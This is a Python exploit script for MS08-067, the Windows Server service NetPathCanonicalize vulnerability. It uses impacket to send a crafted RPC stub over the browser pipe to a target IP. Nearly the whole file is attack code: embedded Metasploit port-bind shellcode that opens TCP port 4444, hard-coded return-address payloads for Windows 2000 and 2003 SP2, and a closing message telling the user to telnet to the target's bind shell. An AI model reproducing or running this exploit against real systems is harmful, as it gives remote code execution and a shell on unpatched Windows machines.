#!/usr/bin/env python
#############################################################################
#   MS08-067 Exploit by Debasis Mohanty (aka Tr0y/nopsled)
#   www.hackingspirits.com
#   www.coffeeandsecurity.com
#   Email: d3basis.m0hanty @ gmail.com
#############################################################################

import struct
import sys

from threading import Thread    #Thread is imported incase you would like to modify
                                #the src to run against multiple targets.

try:
    from impacket import smb
    from impacket import uuid
    from impacket.dcerpc import dcerpc
    from impacket.dcerpc import transport
except ImportError, _:
    print 'Install the following library to make this script work'
    print 'Impacket : http://oss.coresecurity.com/projects/impacket.html'
    print 'PyCrypto : http://www.amk.ca/python/code/crypto.html'
    sys.exit(1)


print '#######################################################################'
print '#   MS08-067 Exploit by Debasis Mohanty (aka Tr0y/nopsled)'
print '#   www.hackingspirits.com'
print '#   www.coffeeandsecurity.com'
print '#   Email: d3basis.m0hanty @ gmail.com'
print '#######################################################################\n'


#Portbind shellcode from metasploit; Binds port to TCP port 4444
shellcode  = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode += "\x29\xc9\x83\xe9\xb0\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e\xe9"
shellcode += "\x4a\xb6\xa9\x83\xee\xfc\xe2\xf4\x15\x20\x5d\xe4\x01\xb3\x49\x56"
shellcode += "\x16\x2a\x3d\xc5\xcd\x6e\x3d\xec\xd5\xc1\xca\xac\x91\x4b\x59\x22"
shellcode += "\xa6\x52\x3d\xf6\xc9\x4b\x5d\xe0\x62\x7e\x3d\xa8\x07\x7b\x76\x30"
shellcode += "\x45\xce\x76\xdd\xee\x8b\x7c\xa4\xe8\x88\x5d\x5d\xd2\x1e\x92\x81"
shellcode += "\x9c\xaf\x3d\xf6\xcd\x4b\x5d\xcf\x62\x46\xfd\x22\xb6\x56\xb7\x42"
shellcode += "\xea\x66\x3d\x20\x85\x6e\xaa\xc8\x2a\x7b\x6d\xcd\x62\x09\x86\x22"
shellcode += "\xa9\x46\x3d\xd9\xf5\xe7\x3d\xe9\xe1\x14\xde\x27\xa7\x44\x5a\xf9"
shellcode += "\x16\x9c\xd0\xfa\x8f\x22\x85\x9b\x81\x3d\xc5\x9b\xb6\x1e\x49\x79"
shellcode += "\x81\x81\x5b\x55\xd2\x1a\x49\x7f\xb6\xc3\x53\xcf\x68\xa7\xbe\xab"
shellcode += "\xbc\x20\xb4\x56\x39\x22\x6f\xa0\x1c\xe7\xe1\x56\x3f\x19\xe5\xfa"
shellcode += "\xba\x19\xf5\xfa\xaa\x19\x49\x79\x8f\x22\xa7\xf5\x8f\x19\x3f\x48"
shellcode += "\x7c\x22\x12\xb3\x99\x8d\xe1\x56\x3f\x20\xa6\xf8\xbc\xb5\x66\xc1"
shellcode += "\x4d\xe7\x98\x40\xbe\xb5\x60\xfa\xbc\xb5\x66\xc1\x0c\x03\x30\xe0"
shellcode += "\xbe\xb5\x60\xf9\xbd\x1e\xe3\x56\x39\xd9\xde\x4e\x90\x8c\xcf\xfe"
shellcode += "\x16\x9c\xe3\x56\x39\x2c\xdc\xcd\x8f\x22\xd5\xc4\x60\xaf\xdc\xf9"
shellcode += "\xb0\x63\x7a\x20\x0e\x20\xf2\x20\x0b\x7b\x76\x5a\x43\xb4\xf4\x84"
shellcode += "\x17\x08\x9a\x3a\x64\x30\x8e\x02\x42\xe1\xde\xdb\x17\xf9\xa0\x56"
shellcode += "\x9c\x0e\x49\x7f\xb2\x1d\xe4\xf8\xb8\x1b\xdc\xa8\xb8\x1b\xe3\xf8"
shellcode += "\x16\x9a\xde\x04\x30\x4f\x78\xfa\x16\x9c\xdc\x56\x16\x7d\x49\x79"
shellcode += "\x62\x1d\x4a\x2a\x2d\x2e\x49\x7f\xbb\xb5\x66\xc1\x19\xc0\xb2\xf6"
shellcode += "\xba\xb5\x60\x56\x39\x4a\xb6\xa9"


#Payload for Windows 2000 target
payload_1='\x41\x00\x5c\x00\x2e\x00\x2e\x00\x5c\x00\x2e\x00\x2e\x00\x5c\x00'
payload_1+='\x41\x41\x41\x41\x41\x41\x41\x41'
payload_1+='\x41\x41\x41\x41\x41\x41\x41\x41'
payload_1+='\x41\x41'
payload_1+='\x2f\x68\x18\x00\x8b\xc4\x66\x05\x94\x04\x8b\x00\xff\xe0'
payload_1+='\x43\x43\x43\x43\x43\x43\x43\x43'
payload_1+='\x43\x43\x43\x43\x43\x43\x43\x43'
payload_1+='\x43\x43\x43\x43\x43\x43\x43\x43'
payload_1+='\x43\x43\x43\x43\x43\x43\x43\x43'
payload_1+='\x43\x43\x43\x43\x43\x43\x43\x43'
payload_1+='\xeb\xcc'
payload_1+='\x00\x00'

#Payload for Windows 2003[SP2] target
payload_2='\x41\x00\x5c\x00'
payload_2+='\x2e\x00\x2e\x00\x5c\x00\x2e\x00'
payload_2+='\x2e\x00\x5c\x00\x0a\x32\xbb\x77'
payload_2+='\x8b\xc4\x66\x05\x60\x04\x8b\x00'
payload_2+='\x50\xff\xd6\xff\xe0\x42\x84\xae'
payload_2+='\xbb\x77\xff\xff\xff\xff\x01\x00'
payload_2+='\x01\x00\x01\x00\x01\x00\x43\x43'
payload_2+='\x43\x43\x37\x48\xbb\x77\xf5\xff'
payload_2+='\xff\xff\xd1\x29\xbc\x77\xf4\x75'
payload_2+='\xbd\x77\x44\x44\x44\x44\x9e\xf5'
payload_2+='\xbb\x77\x54\x13\xbf\x77\x37\xc6'
payload_2+='\xba\x77\xf9\x75\xbd\x77\x00\x00'


if sys.argv[2]=='1':    #Windows 2000 Payload
    payload=payload_1
    print '[-]Windows 2000 payload loaded'
if sys.argv[2]=='2':    #Windows 2003[SP2] Payload
    payload=payload_2
    print '[-]Windows 2003[SP2] payload loaded'


class SRVSVC_Exploit(Thread):
    def __init__(self, target, osver, port=445):
        super(SRVSVC_Exploit, self).__init__()
        self.__port   = port
        self.target   = target
        self.osver   = osver

    def __DCEPacket(self):
        print '[-]Initiating connection'
        self.__trans = transport.DCERPCTransportFactory('ncacn_np:%s[\\pipe\\browser]' % self.target)
        self.__trans.connect()
        print '[-]connected to ncacn_np:%s[\\pipe\\browser]' % self.target
        self.__dce = self.__trans.DCERPC_class(self.__trans)
        self.__dce.bind(uuid.uuidtup_to_bin(('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0')))
        
        # Constructing Malicious Packet
        self.__stub='\x01\x00\x00\x00'
        self.__stub+='\xd6\x00\x00\x00\x00\x00\x00\x00\xd6\x00\x00\x00'
        self.__stub+=shellcode
        self.__stub+='\x41\x41\x41\x41\x41\x41\x41\x41'
        self.__stub+='\x41\x41\x41\x41\x41\x41\x41\x41'
        self.__stub+='\x41\x41\x41\x41\x41\x41\x41\x41'
        self.__stub+='\x41\x41\x41\x41\x41\x41\x41\x41'
        self.__stub+='\x41\x41\x41\x41\x41\x41\x41\x41'
        self.__stub+='\x41\x41\x41\x41\x41\x41\x41\x41'
        self.__stub+='\x41\x41\x41\x41\x41\x41\x41\x41'
        self.__stub+='\x41\x41\x41\x41\x41\x41\x41\x41'
        self.__stub+='\x00\x00\x00\x00'
        self.__stub+='\x2f\x00\x00\x00\x00\x00\x00\x00\x2f\x00\x00\x00'
        self.__stub+=payload
        self.__stub+='\x00\x00\x00\x00'
        self.__stub+='\x02\x00\x00\x00\x02\x00\x00\x00'
        self.__stub+='\x00\x00\x00\x00\x02\x00\x00\x00'
        self.__stub+='\x5c\x00\x00\x00\x01\x00\x00\x00'
        self.__stub+='\x01\x00\x00\x00'
        return

    def run(self):
        self.__DCEPacket()
        self.__dce.call(0x1f, self.__stub)   #0x1f (or 31)- NetPathCanonicalize Operation
        print '[-]Exploit sent to target successfully...\n[1]Telnet to port 4444 on target machine...'

if __name__ == '__main__':
       try:
               target = sys.argv[1]
               osver = sys.argv[2]
       except IndexError:
               print '\nUsage: %s <target ip> <os version>\n' % sys.argv[0]
               print 'Example: srvsvcexpl.py 192.168.1.1 2\n'
               print 'Select OS Version'
               print '[-]Windows 2000: OS Version = 1'
               print '[-]Windows 2003[SP2]: OS Version = 2'

               sys.exit(-1)

current = SRVSVC_Exploit(target, osver)
current.start()
#print '[-]Exploit sent to target successfully...\n[-]Telnet to port 4444 on target machine...'